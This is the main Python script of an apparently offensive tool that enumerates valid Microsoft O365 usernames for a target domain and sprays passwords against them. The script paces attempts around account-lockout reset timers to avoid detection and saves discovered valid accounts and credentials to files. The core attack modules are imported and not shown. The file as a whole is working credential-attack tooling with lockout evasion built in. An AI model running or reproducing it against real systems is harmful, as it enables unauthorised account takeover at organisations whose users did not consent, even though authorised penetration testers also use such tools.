#!/usr/bin/env python3

import time
import argparse
from core.helper import Helper
from core.sprayer import Sprayer
from core.validator import Validator
from core.enumerator import Enumerator


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer")

    parser.add_argument("-d", "--domain",   type=str,   help="Target O365 domain", required=True)
    parser.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")
    parser.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
    parser.add_argument("-s", "--spray",    action="store_true", help="Perform password spraying")
    parser.add_argument("-u", "--username", type=str, help="Username(s) delimited using commas")
    parser.add_argument("-p", "--password", type=str, help="Password(s) delimited using commas")
    parser.add_argument("-U", "--userfile", type=str, help="File containing list of usernames")
    parser.add_argument("-P", "--passfile", type=str, help="File containing list of passwords")
    parser.add_argument("-c", "--count",    type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
    parser.add_argument("-l", "--lockout",  type=float, help="Lockout policy reset time (in minutes). Default: 5 minutes", default=5.0)
    parser.add_argument("--secondary",      action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`. User `OpenID-Config` for validation instead of `getuserrealm`.")

    parser.add_argument("--timeout", type=int, help="Request timeout. Default: 25", default=25)
    parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>")
    parser.add_argument("--output",  type=str, help="Output directory. Default: .", default="./")
    parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
    parser.add_argument("--debug",   action="store_true", help="Debug output")

    args = parser.parse_args()


    # If enumerating users make sure we have a username or username file
    if args.enum and (not args.username and not args.userfile):
        parser.error("-u/--username or -U/--userfile is required when performing user enumeration via -e/--enum.")

    # If password spraying make sure we have username(s) and password(s)
    if args.spray and ((not args.username and not args.userfile) or (not args.password and not args.passfile)):
        parser.error("[-u/--username or -U/--userfile] and [-p/--password or -P/--passfile] are required" +
            " when performing password spraying via -s/--spray.")

    start  = time.time()
    helper = Helper()

    # Perform domain validation
    if args.validate:
        print("[*] Performing O365 validation for: %s" % args.domain)
        validator = Validator(timeout=args.timeout, proxy=args.proxy, debug=args.debug, secondary=args.secondary)
        validator.validate(args.domain)
        if not validator.o365:
            (args.enum, args.spray) = (False, False)

    # Perform user enumeration
    if args.enum:
        # We chose to parse files first
        userlist = helper.get_list_from_file(args.userfile) if args.userfile else args.username.split(',')
        password = "Password1" if not args.password else args.password
        print("\n[*] Performing user enumeration against %d potential users" % (len(userlist)))
        enum = Enumerator(timeout=args.timeout, proxy=args.proxy, debug=args.debug)
        enum.loop.run_until_complete(enum.run(userlist, args.domain, password))

        print("[+] Valid Accounts: %d" % len(enum.valid_accts))
        helper.write_data(enum.valid_accts, "%s/valid_users.txt" % (args.output))

    # Perform password spray
    if args.spray:
        # Use validated users if enumeration was run
        if args.enum:
            print("\n[*] Enumeration was run. Resetting lockout before password spraying.")
            print("[*] Sleeping for %.1f minutes" % (args.lockout))
            userlist = enum.valid_accts
            helper.lockout_reset_wait(args.lockout)

        else:
            userlist = helper.get_list_from_file(args.userfile) if args.userfile else args.username.split(',')

        # Make sure we actually have users to spray (for when enum is run first)
        if len(userlist) > 0:
            passlist = helper.get_list_from_file(args.passfile) if args.passfile else args.password.split(',')

            spray = Sprayer(userlist, timeout=args.timeout, proxy=args.proxy, debug=args.debug, secondary=args.secondary)

            print("\n[*] Performing password spray against %d users" % (len(userlist)))
            if not args.paired:
                for password_chunk in helper.get_chunks_from_list(passlist, args.count):
                    print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
                    spray.loop.run_until_complete(spray.run(password_chunk, args.domain))
                    if not helper.check_last_chunk(password_chunk, passlist):
                        print("[*] Sleeping for %.1f minutes" % (args.lockout))
                        helper.lockout_reset_wait(args.lockout)

            else:
                print("[*] Password spraying using paired usernames and passwords.")
                spray.loop.run_until_complete(spray.run_paired(passlist, args.domain))
                # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call

            print("[+] Valid Credentials: %d" % len(spray.valid_creds))
            helper.write_data(spray.valid_creds, "%s/valid_credentials.txt" % (args.output))

        else:
            if args.debug: print("\n[DEBUG] No users to run a password spray against.")


    elapsed = time.time() - start
    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))